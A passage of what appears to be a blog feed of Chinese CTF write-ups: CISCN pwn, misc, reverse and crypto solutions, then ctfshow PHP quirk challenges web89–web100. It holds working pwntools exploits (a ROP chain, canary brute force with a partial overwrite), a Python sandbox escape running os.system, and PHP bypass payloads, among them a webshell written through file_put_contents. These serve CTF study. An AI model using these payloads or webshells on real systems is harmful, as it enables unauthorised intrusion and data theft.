0x0000000000496710) # add rax, 1 ; retp +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retp +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000402404) # syscallprint(len(p))io.sendline(p)io.interactive()</code></pre><h2 id="funcanary"><a href="#funcanary" class="headerlink" title="funcanary"></a>funcanary</h2><ul><li>利用fork无限创建子进程去爆破出canary，最后利用穷举去partial write从而绕过pie<pre class="language-none"><code class="language-none">from pwn import *context(log_level&#x3D;&#39;debug&#39;,arch&#x3D;&#39;amd64&#39;,os&#x3D;&#39;linux&#39;)local &#x3D; 0elf &#x3D; ELF(&#39;.&#x2F;funcanary&#39;)#gdb.attach(p)if local:    p &#x3D; process(&#39;.&#x2F;funcanary&#39;)    libc &#x3D; elf.libcelse:    p &#x3D; remote(&#39;47.94.206.10&#39;,29297)   # libc &#x3D; ELF(&#39;.&#x2F;&#39;)p.recvuntil(&#39;welcome\n&#39;)canary &#x3D; b&#39;\x00&#39;for k in range(7):    for i in range(256):        print (&quot;the &quot; + str(k) + &quot;: &quot; + str(i))        p.send(b&#39;a&#39;*0x68 + canary + p8(i))        a &#x3D; p.recvuntil(&quot;welcome\n&quot;)        print (a)        if &quot;fun&quot; in str(a):                canary +&#x3D; p8(i)                print(&#39;canary:&#39;)                print(canary)                break                print(canary)target&#x3D;0x1228payload&#x3D;b&#39;a&#39;*0x68+canary+p64(0)+b&#39;\x28&#39;+b&#39;\x02&#39;p.send(payload)p.recv()payload&#x3D;b&#39;a&#39;*0x68+canary+p64(0)+b&#39;\x28&#39;+b&#39;\x12&#39;p.send(payload)p.recv()payload&#x3D;b&#39;a&#39;*0x68+canary+p64(0)+b&#39;\x28&#39;+b&#39;\x22&#39;p.send(payload)p.recv()payload&#x3D;b&#39;a&#39;*0x68+canary+p64(0)+b&#39;\x28&#39;+b&#39;\x32&#39;p.send(payload)p.recv()payload&#x3D;b&#39;a&#39;*0x68+canary+p64(0)+b&#39;\x28&#39;+b&#39;\x42&#39;p.send(payload)p.recv()payload&#x3D;b&#39;a&#39;*0x68+canary+p64(0)+b&#39;\x28&#39;+b&#39;\x52&#39;p.send(payload)p.recv()payload&#x3D;b&#39;a&#39;*0x68+canary+p64(0)+b&#39;\x28&#39;+b&#39;\x62&#39;p.send(payload)p.recv()payload&#x3D;b&#39;a&#39;*0x68+canary+p64(0)+b&#39;\x28&#39;+b&#39;\x72&#39;p.send(payload)p.recv()payload&#x3D;b&#39;a&#39;*0x68+canary+p64(0)+b&#39;\x28&#39;+b&#39;\x82&#39;p.send(payload)p.recv()payload&#x3D;b&#39;a&#39;*0x68+canary+p64(0)+b&#39;\x28&#39;+b&#39;\x92&#39;p.send(payload)p.recv()payload&#x3D;b&#39;a&#39;*0x68+canary+p64(0)+b&#39;\x28&#39;+b&#39;\xa2&#39;p.send(payload)p.recv()payload&#x3D;b&#39;a&#39;*0x68+canary+p64(0)+b&#39;\x28&#39;+b&#39;\xb2&#39;p.send(payload)p.recv()payload&#x3D;b&#39;a&#39;*0x68+canary+p64(0)+b&#39;\x28&#39;+b&#39;\xc2&#39;p.send(payload)p.recv()payload&#x3D;b&#39;a&#39;*0x68+canary+p64(0)+b&#39;\x28&#39;+b&#39;\xd2&#39;p.send(payload)p.recv()payload&#x3D;b&#39;a&#39;*0x68+canary+p64(0)+b&#39;\x28&#39;+b&#39;\xe2&#39;p.send(payload)p.recv()payload&#x3D;b&#39;a&#39;*0x68+canary+p64(0)+b&#39;\x28&#39;+b&#39;\xf2&#39;p.send(payload)p.interactive()</code></pre></li></ul><h1 id="Misc-1"><a href="#Misc-1" class="headerlink" title="Misc"></a>Misc</h1><h2 id="27-签到卡"><a href="#27-签到卡" class="headerlink" title="27_签到卡"></a>27_签到卡</h2><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34422172/1685266137154-e562de8e-145a-4c53-9ba4-1d691c3b6c0a.png" alt="image.png"><br>把&#x2F;etc&#x2F;passwd改为&#x2F;flag即可<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34422172/1685266206911-f3dfffcb-b96c-4bfc-9c6c-8bbaa548aa14.png" alt="image.png"></p><h2 id="pyshell"><a href="#pyshell" class="headerlink" title="pyshell"></a>pyshell</h2><p>nc到远端，发现输入什么命令都是nop，但是字符串可以回显，但是长度还有所限制，用“_”拼接（“_”可以表示上一次执行的结果），再用“+”拼接成一条字符串表达式，用eval()函数执行</p><pre class="language-python" data-language="python"><code class="language-python">&#39;__imp&#39;#&#39;__imp&#39;_+&#39;ort&#39;#&#39;__import&#39;_+&#39;__(&#39;#&#39;__import__(&#39;_+&quot;&#39;os&quot;#&quot;__import__(&#39;os&quot;_+&quot;&#39;).&quot;#&quot;__import__(&#39;os&#39;).&quot;_+&quot;sys&quot;#&quot;__import__(&#39;os&#39;).sys&quot;_+&quot;tem&quot;#&quot;__import__(&#39;os&#39;).system&quot;_+&quot;(&#39;c&quot;#&quot;__import__(&#39;os&#39;).system(&#39;c&quot;_+&quot;at &quot;#&quot;__import__(&#39;os&#39;).system(&#39;cat &quot;_+&quot;&#x2F;f*&quot;#&quot;__import__(&#39;os&#39;).system(&#39;cat &#x2F;f*&quot;_+&quot;&#39;)&quot;#&quot;__import__(&#39;os&#39;).system(&#39;cat &#x2F;f*&#39;)&quot;eval(_)</code></pre><h2 id="网络安全人才实战能力评价现状调查问卷"><a href="#网络安全人才实战能力评价现状调查问卷" class="headerlink" title="网络安全人才实战能力评价现状调查问卷"></a>网络安全人才实战能力评价现状调查问卷</h2><p>交完问卷出flag</p><h1 id="Re-1"><a href="#Re-1" class="headerlink" title="Re"></a>Re</h1><h2 id="babyRE"><a href="#babyRE" class="headerlink" title="babyRE"></a>babyRE</h2><p>先打开看看，xml不是很懂，google了一下<a href="https://snap.berkeley.edu/">snap</a>这个网站用法，打开这个网站导入xml。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1685368574488-88897496-5683-4038-a914-e540254aaf7f.png" alt="image.png"><br>跟着步骤走，点击绿旗子按空格开始<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1685368574961-d96409ba-4664-4b49-903b-49da9aa9f548.png" alt="image.png"><br>运行到lock这里提示输入flag，看到lock的控件里面有多个插入数字操作，应该是密文<br>提取出来得到<code>[102,10,13,6,28,74,3,1,3,7,85,0,4,75,20,92,92,8,28,25,81,83,7,28,76,88,9,0,29,73,0,86,4,87,87,82,84,85,4,85,87,30]</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1685368575470-1a7f2707-9427-480a-bae4-b585f92cb8fb.png" alt="image.png"><br>加密逻辑在右边，是各项异或<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1685368574439-63fef859-1b6e-4212-a653-8a2d0970e8d0.png" alt="image.png"></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="language-python" data-language="python"><code class="language-python"># babyREflag&#x3D;[102,10,13,6,28,74,3,1,3,7,85,0,4,75,20,92,92,8,28,25,81,83,7,28,76,88,9,0,29,73,0,86,4,87,87,82,84,85,4,85,87,30]for i in range(1,len(flag)):    flag[i]&#x3D;flag[i] ^ flag[i-1]for i in range(0,len(flag)):    print(chr(flag[i]),end&#x3D;&quot;&quot;)</code></pre><h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><p><code>flag&#123;12307bbf-9e91-4e61-a900-dd26a6d0ea4c&#125;</code></p><h2 id="ezAndroid"><a href="#ezAndroid" class="headerlink" title="ezAndroid"></a>ezAndroid</h2><p>登录网站试了一下注入好像不行<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1685368574338-83b939d1-02c4-479d-a841-af1c58f9c8af.png" alt="image.png"><br>提示说是找附件漏洞，那就找呗，一堆apk里面就cpweb.apk最可疑<br>用jadx-gui打开，查看一下。先搜索MainActivity，但是好像没啥有用的东西<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1685368575624-7f32685f-51c9-4514-aba5-500a2d98f94b.png" alt="image.png"><br>但是跟MainActivity同目录下有好多个Server，猜测漏洞可能就出在这里，重点看了一下WebServer<br>这里有个路径穿越拼接，应该可以利用这个漏洞。请队里的web手抓包一下。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1685368575781-1972b843-34d4-4d88-8fe1-df65ec45b035.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1685269052746-fa0d3dab-1e41-4f3a-a1d2-92ea55c9b64d.png" alt="image.png"></p><h3 id="flag-1"><a href="#flag-1" class="headerlink" title="flag"></a>flag</h3><p><code>flag&#123;15131359-6d71-45d3-b2ad-73e2f2335a7c&#125;</code></p><h1 id="Crypto-1"><a href="#Crypto-1" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="27日-基于国密SM2算法的密钥密文分发"><a href="#27日-基于国密SM2算法的密钥密文分发" class="headerlink" title="27日_基于国密SM2算法的密钥密文分发"></a>27日_基于国密SM2算法的密钥密文分发</h2><blockquote><p><a href="https://const.net.cn/tool/sm2/genkey/">https://const.net.cn/tool/sm2/genkey/</a><br><a href="https://const.net.cn/tool/sm2/sm2-decrypt/">https://const.net.cn/tool/sm2/sm2-decrypt/</a><br><a href="https://const.net.cn/tool/sm4/sm4-ecb-decrypt/">https://const.net.cn/tool/sm4/sm4-ecb-decrypt/</a> </p></blockquote><p>使用网站内容按照步骤操作即可。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1685167591369-86affce6-458e-4054-ac34-059c28c9035e.png" alt="image.png"></p><h2 id="27日-Sign-in-passwd"><a href="#27日-Sign-in-passwd" class="headerlink" title="27日_Sign_in_passwd"></a>27日_Sign_in_passwd</h2><p>按照排列映射加密</p><pre class="language-none"><code class="language-none">import base64import urllib.parseafter &#x3D; r&#39;GHI3KLMNJOPQRSTUb%3DcdefghijklmnopWXYZ%2F12%2B406789VaqrstuvwxyzABCDEF5&#39;asc &#x3D; urllib.parse.unquote(after)former &#x3D; r&#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+&#x2F;&#x3D;&#39;change &#x3D; str.maketrans(asc, former)flag &#x3D; r&#39;j2rXjx8yjd&#x3D;YRZWyTIuwRdbyQdbqR3R9iZmsScutj2iqj3&#x2F;tidj1jd&#x3D;D&#39;flaga &#x3D; flag.translate(change)print(base64.b64decode(flaga).decode(&#39;utf-8&#39;))</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
            <tag> CISCN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web89-web105php特性篇（一）</title>
      <link href="/posts/37f43c4f/"/>
      <url>/posts/37f43c4f/</url>
      
        <content type="html"><![CDATA[<h1 id="web89"><a href="#web89" class="headerlink" title="web89"></a>web89</h1><pre class="language-python" data-language="python"><code class="language-python">include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#39;num&#39;]))&#123;    $num &#x3D; $_GET[&#39;num&#39;];    if(preg_match(&quot;&#x2F;[0-9]&#x2F;&quot;, $num))&#123;        die(&quot;no no no!&quot;);    &#125;    if(intval($num))&#123;        echo $flag;    &#125;&#125;</code></pre><p>遇事不决先试试数组捏，<code>?num[]=1</code></p><h1 id="web90"><a href="#web90" class="headerlink" title="web90"></a>web90</h1><pre class="language-python" data-language="python"><code class="language-python">include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#39;num&#39;]))&#123;    $num &#x3D; $_GET[&#39;num&#39;];    if($num&#x3D;&#x3D;&#x3D;&quot;4476&quot;)&#123;        die(&quot;no no no!&quot;);    &#125;    if(intval($num,0)&#x3D;&#x3D;&#x3D;4476)&#123;        echo $flag;    &#125;else&#123;        echo intval($num,0);    &#125;&#125;</code></pre><p>4476后加任意字符即可。<code>?num=4476a</code>。<br>我们默认的上传类型就是字符型，我们直接在末尾添加一个字符就可以。</p><h1 id="web91"><a href="#web91" class="headerlink" title="web91"></a>web91</h1><blockquote><p><a href="https://blog.csdn.net/qq_46091464/article/details/108278486">https://blog.csdn.net/qq_46091464&#x2F;article&#x2F;details&#x2F;108278486</a><br><a href="https://www.leavesongs.com/PENETRATION/apache-cve-2017-15715-vulnerability.html">https://www.leavesongs.com/PENETRATION/apache-cve-2017-15715-vulnerability.html</a></p></blockquote><pre class="language-python" data-language="python"><code class="language-python">show_source(__FILE__);include(&#39;flag.php&#39;);$a&#x3D;$_GET[&#39;cmd&#39;];if(preg_match(&#39;&#x2F;^php$&#x2F;im&#39;, $a))&#123;    if(preg_match(&#39;&#x2F;^php$&#x2F;i&#39;, $a))&#123;        echo &#39;hacker&#39;;    &#125;    else&#123;        echo $flag;    &#125;&#125;else&#123;    echo &#39;nonononono&#39;;&#125;</code></pre><p>这个题一上来没看懂，要搞懂他先要理解他的过滤是什么意思。</p><ul><li><code>^</code> “行首”元字符 (^) 仅匹配字符串的开始位置</li><li><code>**$**</code>“行末”元字符 ($) 仅匹配字符串末尾，或者最后的换行符(除非设置了 D 修饰符)</li></ul><p>默认情况下，preg_match函数会认为目标字符串是单行组成的，当目标字符串中有换行符或者匹配中出现^或者$会受到影响。<br>并且末尾的m的意义如下。<br>因此综上意思就是，要求传入内容中有php，但是第一行中没有php。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1681977422503-fb5ac281-d0e2-4af8-a0ba-db71b32378ad.png" alt="image.png"><br>因此payload：<code>abc%0aphp</code></p><h2 id="备注"><a href="#备注" class="headerlink" title="备注"></a>备注</h2><p>附PCRE模式修正符</p><blockquote><p>参考文章·：<a href="https://blog.csdn.net/forest_fire/article/details/50944901">https://blog.csdn.net/forest_fire&#x2F;article&#x2F;details&#x2F;50944901</a></p></blockquote><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1681977497562-fb227ad1-c636-42ab-8b63-5ef842146ece.png" alt="image.png"></p><p>wp中提到的另一个漏洞：</p><blockquote><p><a href="https://www.leavesongs.com/PENETRATION/apache-cve-2017-15715-vulnerability.html">https://www.leavesongs.com/PENETRATION/apache-cve-2017-15715-vulnerability.html</a></p></blockquote><h1 id="web92"><a href="#web92" class="headerlink" title="web92"></a>web92</h1><pre class="language-php" data-language="php"><code class="language-php">include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#39;num&#39;]))&#123;  $num &#x3D; $_GET[&#39;num&#39;];  if($num&#x3D;&#x3D;4476)&#123;    die(&quot;no no no!&quot;);  &#125;  if(intval($num,0)&#x3D;&#x3D;4476)&#123;    echo $flag;  &#125;else&#123;    echo intval($num,0);  &#125;&#125;</code></pre><p>intval()函数如果$base为0则$var中存在字母的话遇到字母就停止读取 但是e这个字母比较特殊，可以在PHP中不是科学计数法。所以为了绕过前面的&#x3D;&#x3D;4476我们就可以构造 4476e123 其实不需要是e其他的字母也可以。<br>payload：</p><pre class="language-php" data-language="php"><code class="language-php">?num&#x3D;0x117c    &#x2F;&#x2F;十六进制?num&#x3D;010574    &#x2F;&#x2F;八进制?num&#x3D;4476e123</code></pre><h1 id="web93"><a href="#web93" class="headerlink" title="web93"></a>web93</h1><pre class="language-php" data-language="php"><code class="language-php">include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#39;num&#39;]))&#123;    $num &#x3D; $_GET[&#39;num&#39;];    if($num&#x3D;&#x3D;4476)&#123;        die(&quot;no no no!&quot;);    &#125;    if(preg_match(&quot;&#x2F;[a-z]&#x2F;i&quot;, $num))&#123;        die(&quot;no no no!&quot;);    &#125;    if(intval($num,0)&#x3D;&#x3D;4476)&#123;        echo $flag;    &#125;else&#123;        echo intval($num,0);    &#125;&#125;</code></pre><p>十六进制里面会有字符，但是八进制仍然可以使用。<br>payload：<code>010574</code></p><h1 id="web94"><a href="#web94" class="headerlink" title="web94"></a>web94</h1><pre class="language-php" data-language="php"><code class="language-php">include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#39;num&#39;]))&#123;    $num &#x3D; $_GET[&#39;num&#39;];    if($num&#x3D;&#x3D;&#x3D;&quot;4476&quot;)&#123;        die(&quot;no no no!&quot;);    &#125;    if(preg_match(&quot;&#x2F;[a-z]&#x2F;i&quot;, $num))&#123;        die(&quot;no no no!&quot;);    &#125;    if(!strpos($num, &quot;0&quot;))&#123;        die(&quot;no no no!&quot;);    &#125;    if(intval($num,0)&#x3D;&#x3D;&#x3D;4476)&#123;        echo $flag;    &#125;&#125;</code></pre><p>strpos() f函数查找字符串在另一字符串中第一次出现的位置（区分大小写）。这里检测了不让第一位为0。<br>但是这个函数是可以被绕过的，利用<code>%0a</code>、<code>.</code>、<code>+</code>、<code> </code>都可以使用：</p><pre class="language-php" data-language="php"><code class="language-php">对于strpos()函数，我们可以利用换行进行绕过（%0a）payload:?num&#x3D;%0a010574也可以小数点绕过payload：?num&#x3D;4476.0因为intval()函数只读取整数部分还可以八进制绕过(%20是空格的url编码形式)payload：?num&#x3D;%20010574?num&#x3D; 010574 &#x2F;&#x2F; 前面加个空格?num&#x3D;+010574 ?num&#x3D;+4476.0</code></pre><h1 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h1><pre class="language-php" data-language="php"><code class="language-php">include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#39;num&#39;]))&#123;    $num &#x3D; $_GET[&#39;num&#39;];    if($num&#x3D;&#x3D;4476)&#123;        die(&quot;no no no!&quot;);    &#125;    if(preg_match(&quot;&#x2F;[a-z]|\.&#x2F;i&quot;, $num))&#123;        die(&quot;no no no!!&quot;);    &#125;    if(!strpos($num, &quot;0&quot;))&#123;        die(&quot;no no no!!!&quot;);    &#125;    if(intval($num,0)&#x3D;&#x3D;&#x3D;4476)&#123;        echo $flag;    &#125;&#125;</code></pre><p>同上题payload：<code>num=%20010574</code></p><h1 id="web96"><a href="#web96" class="headerlink" title="web96"></a>web96</h1><pre class="language-php" data-language="php"><code class="language-php">highlight_file(__FILE__);if(isset($_GET[&#39;u&#39;]))&#123;    if($_GET[&#39;u&#39;]&#x3D;&#x3D;&#39;flag.php&#39;)&#123;        die(&quot;no no no&quot;);    &#125;else&#123;        highlight_file($_GET[&#39;u&#39;]);    &#125;&#125;</code></pre><p>payload：<code>?u=./flag.php</code>这个.&#x2F;可以表示当前目录</p><h1 id="web97"><a href="#web97" class="headerlink" title="web97"></a>web97</h1><pre class="language-php" data-language="php"><code class="language-php">include(&quot;flag.php&quot;);highlight_file(__FILE__);if (isset($_POST[&#39;a&#39;]) and isset($_POST[&#39;b&#39;])) &#123;if ($_POST[&#39;a&#39;] !&#x3D; $_POST[&#39;b&#39;])if (md5($_POST[&#39;a&#39;]) &#x3D;&#x3D;&#x3D; md5($_POST[&#39;b&#39;]))echo $flag;elseprint &#39;Wrong.&#39;;&#125;?&gt;</code></pre><p>直接用数组绕过：<code>a[]=1&amp;b[]=2</code></p><h2 id="方法二-强碰撞"><a href="#方法二-强碰撞" class="headerlink" title="方法二 强碰撞"></a>方法二 强碰撞</h2><p><code>a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</code><br>需要用bp提交。</p><h1 id="web98"><a href="#web98" class="headerlink" title="web98"></a>web98</h1><blockquote><p><a href="https://www.php.cn/php-weizijiaocheng-383293.html">https://www.php.cn/php-weizijiaocheng-383293.html</a><br><a href="https://www.php.cn/php-notebook-172859.html">https://www.php.cn/php-notebook-172859.html</a></p></blockquote><pre class="language-php" data-language="php"><code class="language-php">include(&quot;flag.php&quot;);$_GET?$_GET&#x3D;&amp;$_POST:&#39;flag&#39;;$_GET[&#39;flag&#39;]&#x3D;&#x3D;&#39;flag&#39;?$_GET&#x3D;&amp;$_COOKIE:&#39;flag&#39;;$_GET[&#39;flag&#39;]&#x3D;&#x3D;&#39;flag&#39;?$_GET&#x3D;&amp;$_SERVER:&#39;flag&#39;;highlight_file($_GET[&#39;HTTP_FLAG&#39;]&#x3D;&#x3D;&#39;flag&#39;?$flag:__FILE__);?&gt;</code></pre><p>分析代码：</p><pre class="language-php" data-language="php"><code class="language-php">include(&quot;flag.php&quot;);$_GET?$_GET&#x3D;&amp;$_POST:&#39;flag&#39;;# 如果有GET传参，就变成POST传参$_GET[&#39;flag&#39;]&#x3D;&#x3D;&#39;flag&#39;?$_GET&#x3D;&amp;$_COOKIE:&#39;flag&#39;;# 如果出传入flag的值为flag，将get传参修改为cookie传参$_GET[&#39;flag&#39;]&#x3D;&#x3D;&#39;flag&#39;?$_GET&#x3D;&amp;$_SERVER:&#39;flag&#39;;# 同理将get转为serverhighlight_file($_GET[&#39;HTTP_FLAG&#39;]&#x3D;&#x3D;&#39;flag&#39;?$flag:__FILE__);# 如果http_flag的值为flag，则值为flag，否则就是本文件</code></pre><p>可以理解为：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpinclude(&#39;flag.php&#39;);if($_GET)&#123;$_GET&#x3D;&amp;$_POST;&#x2F;&#x2F;只要有输入的get参数就将get方法改变为post方法(修改了get方法的地址)&#125;else&#123;&quot;flag&quot;;&#125; if($_GET[&#39;flag&#39;]&#x3D;&#x3D;&#39;flag&#39;)&#123;$_GET&#x3D;&amp;$_COOKIE;&#125;else&#123;&#39;flag&#39;;</code></pre><p>所以直接num传入一个值，然后将post传入<code>HTTP_FLAG=flag</code>即可<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1682927233986-f0da9a13-4af2-45df-bc4e-daea53d31a16.png" alt="image.png"></p><h1 id="web99-in-array"><a href="#web99-in-array" class="headerlink" title="web99 in_array"></a>web99 in_array</h1><pre class="language-php" data-language="php"><code class="language-php">highlight_file(__FILE__);$allow &#x3D; array();for ($i&#x3D;36; $i &lt; 0x36d; $i++) &#123;     array_push($allow, rand(1,$i));&#125;if(isset($_GET[&#39;n&#39;]) &amp;&amp; in_array($_GET[&#39;n&#39;], $allow))&#123;    file_put_contents($_GET[&#39;n&#39;], $_POST[&#39;content&#39;]);&#125;</code></pre><p>可以理解为：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phphighlight_file(__FILE__);$allow &#x3D; array();&#x2F;&#x2F;设置为数组for ($i&#x3D;36; $i &lt; 0x36d; $i++) &#123;array_push($allow, rand(1,$i));&#x2F;&#x2F;向数组里面插入随机数&#125; if(isset($_GET[&#39;n&#39;]) &amp;&amp; in_array($_GET[&#39;n&#39;], $allow))&#123;&#x2F;&#x2F;in_array()函数有漏洞 没有设置第三个参数 就可以形成自动转换eg:n&#x3D;1.php自动转换为1file_put_contents($_GET[&#39;n&#39;], $_POST[&#39;content&#39;]);&#x2F;&#x2F;写入1.php文件 内容是&lt;?php system($_POST[1]);?&gt;&#125; ?&gt;</code></pre><p>in_array函数的漏洞：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1682927691590-12a4253b-84b2-416a-b2dc-d066f82cfd04.png" alt="20210125215956454.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1682927847639-0305094e-2c71-4bc1-8fa8-18982aa0966f.png" alt="image.png"><br>GET传入：<code>n=1.php</code><br>POST传入：<code>content=&lt;?php system($_POST[1]);?&gt;</code><br>然后就进入1.php，post传入：<code>1=tac fl*</code></p><h1 id="web100"><a href="#web100" class="headerlink" title="web100"></a>web100</h1><pre class="language-php" data-language="php"><code class="language-php">highlight_file(__FILE__);include(&quot;ctfshow.php&quot;);&#x2F;&#x2F;flag in class ctfshow;$ctfshow &#x3D; new ctfshow();$v1&#x3D;$_GET[&#39;v1&#39;];$v2&#x3D;$_GET[&#39;v2&#39;];$v3&#x3D;$_GET[&#39;v3&#39;];$v0&#x3D;is_numeric($v1) and is_numeric($v2) and is_numeric($v3);if($v0)&#123;    if(!preg_match(&quot;&#x2F;\;&#x2F;&quot;, $v2))&#123;        if(preg_match(&quot;&#x2F;\;&#x2F;&quot;, $v3))&#123;            eval(&quot;$v2(&#39;ctfshow&#39;)$v3&quot;);        &#125;    &#125;    &#125;</code></pre><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1682928476651-4a45d147-98b3-43e1-9f10-b66df6fc9322.png" alt="20210126121456572.png"><br>所以这道题只需要让v1是truev0就是true了，后面都不用管。然后v2使用命令执行即可。<br>payload：<code>?v1=1&amp;v2=system(&#39;ls&#39;)/*&amp;v3=*/;</code><br><code>?v1=1&amp;v2=system(&#39;cat ctf*&#39;)&amp;v3=;</code><br><code>?v1=1&amp;v2=var_dump($ctfshow)/*&amp;v3=*/;</code><br>这个也行。<br>最后要将0x2d要转化成<code>-</code><br>ctfshow{ee9557f4-b67a-4c79-8603-e5653885d260}</p><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p><strong>但是有几个问题，为什么只能使用&#x2F;</strong>&#x2F;来注释不能用&#x2F;&#x2F;，而且不能如下赋值：**<br><code>**?v1=1&amp;v2=system(&#39;cat ctf*&#39;);/*&amp;v3=*/**</code><br><strong>但是神奇的是用写在本地之后运行这种就可以了。</strong></p><h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>利用反射类<br>payload：<code>?v1=1&amp;v2=echo new ReflectionClass&amp;v3=;</code><br>关于反射类：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpclass A&#123;public static $flag&#x3D;&quot;flag&#123;123123123&#125;&quot;;const  PI&#x3D;3.14;static function hello()&#123;    echo &quot;hello&lt;&#x2F;br&gt;&quot;;&#125;&#125;$a&#x3D;new ReflectionClass(&#39;A&#39;);var_dump($a-&gt;getConstants());  获取一组常量输出 array(1) &#123;  [&quot;PI&quot;]&#x3D;&gt;  float(3.14)&#125;var_dump($a-&gt;getName());    获取类名输出string(1) &quot;A&quot;var_dump($a-&gt;getStaticProperties()); 获取静态属性输出array(1) &#123;  [&quot;flag&quot;]&#x3D;&gt;  string(15) &quot;flag&#123;123123123&#125;&quot;&#125;var_dump($a-&gt;getMethods()); 获取类中的方法输出array(1) &#123;  [0]&#x3D;&gt;  